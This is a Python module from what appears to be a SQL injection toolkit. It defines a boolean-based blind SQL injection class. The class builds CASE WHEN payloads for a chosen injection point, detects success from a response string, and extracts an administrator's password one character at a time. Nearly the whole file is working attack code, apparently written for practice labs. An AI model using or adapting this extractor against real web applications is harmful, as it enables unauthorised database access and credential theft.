from .main import BaseSQLi
from .dbConfig import DB_CONFIG
import string

class BlindBooleanBased(BaseSQLi):
    found_password = ""
    def __init__(self, url, inject_point, targetTable, db_type="oracle", extra_cookies=None, signal="Welcome back!"):
        super().__init__(url, targetTable, db_type, inject_point, extra_cookies)
        self.found_password = "" 
        self.signal = signal
    def build_condition_payload(self, condition):
        return f"'||(SELECT CASE WHEN ({condition}) THEN 1 ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"

    def check_signal(self, response):
        return self.signal in response.text

    def extract(self, column, username='administrator'):
        length = self.detect_length(column, username)
        if not length:
            return None
        for position in range(1, length + 1):
            char = self.extract_char_binary(column, position, username)
            self.found_password += char
            print(f"[+] Position {position}: {char}  →  {self.found_password}")
        return self.found_password

    
                